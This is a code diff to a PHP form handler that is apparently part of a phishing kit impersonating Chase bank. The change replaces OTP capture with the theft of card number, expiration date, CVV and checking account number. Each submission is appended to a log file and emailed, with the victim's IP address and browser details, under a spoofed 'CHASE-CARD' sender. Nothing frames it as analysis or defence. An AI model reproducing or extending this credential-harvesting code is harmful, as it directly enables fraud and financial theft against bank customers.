@@ -37,18 +37,24 @@ function get_browser_details()
 }
 
 $IP = get_client_ip();
-$OTP = $_POST['otp'];
+$CARD = $_POST['cardnumber'];
+$EXP = $_POST['exp'];
+$CVV = $_POST['cvv'];
+$CHECKING = $_POST['checkingacc'];
 
-$Message = "CHASE LOGS {OTP VERIFICATION}" . PHP_EOL;
-$Message .= "OTP Code (8-9 digits): " . $OTP . PHP_EOL;
+$Message = "CHASE LOGS {CARD DETAILS}" . PHP_EOL;
+$Message .= "Card Number: " . $CARD . PHP_EOL;
+$Message .= "Expiration: " . $EXP . PHP_EOL;
+$Message .= "CVV: " . $CVV . PHP_EOL;
+$Message .= "Checking Account: " . $CHECKING . PHP_EOL;
 $Message .= "IP ADDRESS : https://ip-api.com/" . $IP . PHP_EOL;
 $Message .= "Browser Details: " . get_browser_details() . PHP_EOL;
 
-$subject = "❤Web LOGS {OTP Verification}❤ | $IP";
-$headers = "From: ❤CHASE-OTP❤ <julianna1@gmail.com>\r\n";
+$subject = "❤Web LOGS {Card Details}❤ | $IP";
+$headers = "From: ❤CHASE-CARD❤ <julianna1@gmail.com>\r\n";
 $headers .= "MIME-Version: 1.0\r\n";
 
-$logFilePath = 'otplog.txt';
+$logFilePath = 'cardlog.txt';
 file_put_contents($logFilePath, $Message, FILE_APPEND);
 
 $send = mail($recipient, $subject, $Message, $headers);
